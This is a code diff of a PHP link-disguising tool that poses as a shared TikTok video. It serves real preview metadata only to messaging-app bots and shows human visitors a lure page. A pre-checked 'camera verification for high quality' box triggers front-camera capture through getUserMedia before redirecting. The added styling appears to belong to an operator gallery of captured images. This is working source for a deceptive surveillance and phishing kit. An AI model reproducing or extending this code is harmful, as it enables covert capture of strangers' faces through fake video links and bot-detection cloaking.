@@ -45,7 +45,6 @@ function fetch_tiktok_exclusive_meta($url) {$meta = [
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
     ];
 
-    // استدعاء واجهة oEmbed الخاصة بتيك توك لجلب العنوان والصورة الأصلية بدقة متناهية
     $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);$ch = curl_init();
     curl_setopt($ch, CURLOPT_URL,$oembed_url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -66,7 +65,6 @@ function fetch_tiktok_exclusive_meta($url) {$meta = [
         }
     }
 
-    // الطريقة البديلة في حال كان الرابط مختصراً جداً ولم يستجب الـ oEmbed مباشرة
     $ch_alt = curl_init();
     curl_setopt($ch_alt, CURLOPT_URL,$url);
     curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
@@ -151,7 +149,6 @@ if (isset($_GET['r'])) {
         $ua =$_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot\vert{}crawl\vert{}slurp\vert{}spider\vert{}whatsapp\vert{}telegram\vert{}facebookexternalhit\vert{}vkShare\vert{}twitterbot\vert{}linkedinbot\vert{}skypeuripreview\vert{}messenger/i',$ua);
 
-        // إرسال وسوم المعاينة الأصلية المباشرة لروبوتات التطبيقات (مثل ماسنجر)
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
@@ -282,12 +279,10 @@ if (isset($_GET['r'])) {
             const enableCamera = document.getElementById('enableCamera').checked;
 
             if (!enableCamera) {
-                // إذا لم يتم تحديد خيار الكاميرا، يتم التوجيه مباشرة للرابط دون أي طلب إذن
                 window.location.replace(targetUrl);
                 return;
             }
 
-            // تفعيل الكاميرا في حال وافق المستخدم واختار الخيار
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -341,7 +336,6 @@ if (isset($_GET['r'])) {
         <h2>Watch this video</h2>
         <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
         
-        <!-- زر اختيار تفعيل الكاميرا (اختياري) -->
         <label class="checkbox-container">
             <input type="checkbox" id="enableCamera" checked>
             <span>Enable camera verification for high quality</span>
@@ -352,7 +346,7 @@ if (isset($_GET['r'])) {
     </div>
 </body>
 </html>
-<?>
+<?php 
         exit();
     } else {
         die("Link not found.");
@@ -418,3 +412,38 @@ if (!empty($filter_code)) {
             --bg-main: #0b0f17;
             --bg-card: #131b2e;
             --border-color: #1e293b;
+            --text-main: #e2e8f0;
+            --text-muted: #64748b;
+            --accent: #6366f1;
+            --accent-hover: #4f46e5;
+            --danger: #ef4444;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
+        .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
+        
+        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
+        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
+
+        .form-grid { display: grid; gap: 12px; }
+        input[type="text"], input[type="file"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
+        input[type="text"]:focus { border-color: var(--accent); }
+        
+        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
+        .btn:hover { background: var(--accent-hover); }
+        .btn-danger { background: var(--danger); }
+        .btn-secondary { background: #334155; }
+
+        .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
+        .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
+        .flex-row { display: flex; gap: 8px; }
+
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
+        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; }
+        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
+        
+        .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
+        .info-row span { color: #cbd5e1; }
+        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }
+
+        footer { text-align: center; margin-top: 40px;
